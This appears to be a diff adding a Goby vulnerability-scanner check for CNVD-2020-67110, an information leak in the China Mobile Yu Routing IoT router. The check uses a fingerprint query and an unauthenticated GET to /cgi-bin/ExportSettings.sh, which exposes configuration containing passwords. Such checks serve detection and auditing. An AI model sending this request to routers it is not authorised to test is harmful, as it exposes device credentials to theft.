@@ -1,0 +1,52 @@
+{
+      "Name": "China Mobile Yu Routing ExportSettings.sh Info Leak CNVD-2020-67110",
+      "Level": "2",
+      "Tags": [
+            "infoleak"
+      ],
+      "GobyQuery": "body=\"中移\"",
+      "Description": "Yu Routing is an IoT router.",
+      "Product": "China Mobile Yu Routing",
+      "Homepage": "",
+      "Author": "",
+      "Impact": "China Mobile Yu Routing ExportSettings.sh Info Leak.",
+      "Recommendation": "",
+      "References": [
+            "https://www.cnvd.org.cn/flaw/show/CNVD-2020-67110"
+      ],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/cgi-bin/ExportSettings.sh",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Password",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
